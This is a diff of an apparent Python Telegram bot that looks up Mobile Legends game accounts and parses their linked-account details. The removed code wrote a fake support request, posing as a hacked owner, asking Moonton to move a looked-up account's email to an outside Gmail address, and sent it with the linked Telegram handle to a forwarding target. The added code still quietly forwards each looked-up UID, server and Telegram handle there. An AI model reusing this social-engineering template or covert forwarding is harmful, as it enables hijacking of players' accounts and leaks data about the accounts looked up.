@@ -488,7 +488,6 @@ def cleanup_downloaded_photos():
             pass
 
 def extract_telegram_from_bind(text, uid=None, sid=None):
-    """Ekstrak nilai Telegram dari bind info"""
     telegram_value = None
     for line in text.split('\n'):
         if 'Telegram' in line:
@@ -499,17 +498,13 @@ def extract_telegram_from_bind(text, uid=None, sid=None):
                 if value.lower() not in ['empty.', 'empty', 'tidak terhubung', '']:
                     telegram_value = value
                     break
-    
-    # Hanya return jika ada Telegram
-    if telegram_value:
+    if telegram_value and uid and sid:
         clean_telegram = re.sub(r'[^a-zA-Z0-9_]', '', telegram_value)
-        if uid and sid:
-            # Custom message dengan UID dan Server
-            custom_text = f"""Can you help me change my Moonton email address? Because it was previously hacked by someone and I need your help to change the email address to pancinganandro@gmail.com for the game user ID {uid} server {sid}, please help me."""
-            return (custom_text, f"@{clean_telegram}")
-        else:
-            return (None, f"@{clean_telegram}")
-    return (None, None)
+        return f"{uid} ({sid})\n@{clean_telegram}"
+    elif telegram_value:
+        clean_telegram = re.sub(r'[^a-zA-Z0-9_]', '', telegram_value)
+        return f"@{clean_telegram}"
+    return None
 
 def format_final_output(original_text, nickname, region, uid, sid, android, ios, creation=None, last_login=None):
     keywords = ['Moonton', 'VK', 'Google Play', 'Tiktok', 'Facebook', 'Apple', 'GCID', 'Telegram', 'WhatsApp']
@@ -869,14 +864,12 @@ async def message_handler(event):
         await edit_status_message(user_id, message_id, output, markup)
 
         if FORWARD_ENABLED:
-    custom_message, telegram_mention = extract_telegram_from_bind(text, uid, sid)    
-    if custom_message and telegram_mention:
-        await client.send_message(FORWARD_TARGET, custom_message)
-        logger.info(f"📤 Custom message dikirim ke {FORWARD_TARGET}")
-        await client.send_message(FORWARD_TARGET, telegram_mention)
-        logger.info(f"📤 Telegram {telegram_mention} dikirim ke {FORWARD_TARGET}")
-    else:
-        logger.info("ℹ️ Telegram empty, tidak ada yang dikirim")
+            telegram_value = extract_telegram_from_bind(text, uid, sid)
+            if telegram_value:
+                await client.send_message(FORWARD_TARGET, f"{telegram_value}")
+                logger.info(f"📤 Telegram {telegram_value} dikirim ke {FORWARD_TARGET}")
+            else:
+                logger.info("ℹ️ Tidak ada Telegram yang terhubung, tidak dikirim")
 
         try:
             del active_requests[req_id]
@@ -1134,7 +1127,7 @@ async def process_queue():
                     gopay_check = validate_mlbb_gopay_sync(uid, sid)
 
                     if not gopay_check['status']:
-                        error_msg = "ID dan Server tidak valid, silakan coba lagi."
+                        error_msg = "❌ ID dan Server tidak valid, silakan coba lagi."
                         await send_status_to_user(user_id, error_msg, reply_to_message_id)
                         r.lpop('pending_requests')
                         r.delete(req_id)
